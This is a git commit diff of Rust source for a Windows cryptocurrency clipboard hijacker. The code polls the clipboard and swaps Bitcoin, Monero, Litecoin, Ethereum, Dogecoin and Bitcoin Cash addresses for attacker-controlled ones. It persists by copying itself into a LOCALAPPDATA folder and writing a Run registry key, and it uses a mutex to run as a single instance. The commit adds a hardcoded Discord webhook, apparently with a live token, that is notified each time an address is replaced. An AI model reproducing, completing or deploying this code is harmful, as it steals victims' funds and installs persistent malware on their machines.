bed4fc990b94a42591fc5776a21369591d807fc4
Atsukoro1 <dornicakkuba@gmail.com>
2023-05-02 20:05:35 +0200

    feat: 🎸 Sending to webhook

--- src/main.rs
+++ src/main.rs
@@ -1,10 +1,32 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
-use std::{collections::HashMap,env,fs::{copy, create_dir_all},io,path::PathBuf,str::FromStr,thread,time::Duration,};
-use clipboard::{ClipboardProvider, windows_clipboard::WindowsClipboardContext};
-use winreg::{enums::*, RegKey};
+use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
+use std::{
+    collections::HashMap,
+    env,
+    ffi::OsStr,
+    fs::{copy, create_dir_all},
+    io,
+    os::windows::prelude::OsStrExt,
+    path::PathBuf,
+    ptr::null_mut,
+    str::FromStr,
+    thread,
+    time::Duration, ops::Deref,
+};
+use winapi::um::winnt::HANDLE;
+use winapi::{
+    um::{
+        synchapi::{CreateMutexW, OpenMutexW},
+        winnt::SYNCHRONIZE,
+    },
+};
+use winreg::{enums::*, RegKey};
 
+// Make those values unique
+static WEBHOOK: &str = "https://discord.com/api/webhooks/1103006398784212992/50iC4B_EO-wOFggTNnSXi4AXzawaObUmK9LzoNfalQbB6_Xw0T0kRTX2hdeXZLzaDRDf";
+static MUTEX: &str = "Fjv8fWJtM9c2qsK5";
 static FILE_NAME: &str = "jk4dflk4b4jb343jbloijoibfvcs";
 static FOLDER_NAME: &str = "CachedTools";
 
@@ -18,20 +40,17 @@ const BCH_ADDR: &str = "ghgfh";
 fn add_to_startup_registry(path: String) -> io::Result<()> {
     let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
 
-    let key = RegKey::predef(HKEY_CURRENT_USER)
-        .open_subkey_with_flags(sub_key, KEY_WRITE)?;
+    let key = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(sub_key, KEY_WRITE)?;
 
     key.set_value(FILE_NAME, &path)
 }
 
 fn get_destination_path() -> (PathBuf, PathBuf) {
-    let desired_path = PathBuf::from(
-        env::var("LOCALAPPDATA").unwrap()
-    ).join(FOLDER_NAME);
-    
+    let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(FOLDER_NAME);
+
     (
-        desired_path.join(format!("{}.exe", FILE_NAME)), 
-        desired_path
+        desired_path.join(format!("{}.exe", FILE_NAME)),
+        desired_path,
     )
 }
 
@@ -51,7 +70,7 @@ fn persistence() -> io::Result<()> {
     Ok(())
 }
 
-fn scan(check_map: &HashMap<&str, &str>) -> bool {
+fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
     let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();
 
     let result = cb_prov.get_contents();
@@ -69,29 +88,89 @@ fn scan(check_map: &HashMap<&str, &str>) -> bool {
     if let Ok(clipboard_text) = result {
         for (regex_str, address) in check_map {
             if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
-                return true;
+                return Some((
+                    String::from(regex_str.deref()), 
+                    String::from(address.deref())
+                ));
             }
         }
     }
 
-    return false;
+    return None;
 }
 
-fn main() {
-    let map: HashMap<&str, &str> = HashMap::from_iter([
-        (r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$", BTC_ADDR),
-        (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
-        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
-        (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
-        (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
-        (r"^bitcoincash:q[0-9a-zA-Z]{41}$", BCH_ADDR),
-    ]);
-    
-    match persistence() {
-        Ok(..) => loop {
-            scan(&map);
-            thread::sleep(Duration::from_millis(100));
-        },
-        Err(..) => {}
+#[allow(unused_must_use)]
+async fn webhook_new_paste(to: String) -> () {
+    let client = reqwest::Client::new();
+    let payload = format!(r#"{{ "content": "Copied {} address" }}"#, to);
+
+    let res = client
+        .post(WEBHOOK)
+        .header("Content-Type", "application/json")
+        .body(payload)
+        .send()
+        .await;
+}
+
+fn check_mutex() -> bool {
+    let mutex_name: Vec<u16> = OsStr::new(MUTEX)
+        .encode_wide()
+        .chain(Some(0).into_iter())
+        .collect();
+
+    let handle: HANDLE = unsafe { 
+        OpenMutexW(
+            SYNCHRONIZE, 
+            0, 
+            mutex_name.as_ptr()
+        ) 
     };
-} 
+
+    if handle.is_null() {
+        let new_handle: HANDLE = unsafe { 
+            CreateMutexW(
+                null_mut(), 
+                0, 
+                mutex_name.as_ptr()
+            ) 
+        };
+
+        if new_handle.is_null() {
+            return false;
+        }
+    } else {
+        return false;
+    }
+
+    true
+}
+
+#[tokio::main]
+async fn main() {
+    if check_mutex() {
+        let map: HashMap<&str, &str> = HashMap::from_iter([
+            (
+                r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
+                BTC_ADDR,
+            ),
+            (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
+            (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
+            (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
+            (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
+            (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
+        ]);
+
+        match persistence() {
+            Ok(..) => loop {
+                let scan_res = scan(&map);
+
+                if scan_res.is_some() {
+                    webhook_new_paste(scan_res.unwrap().1).await;
+                }
+
+                thread::sleep(Duration::from_millis(100));
+            },
+            Err(..) => {}
+        };
+    }
+}
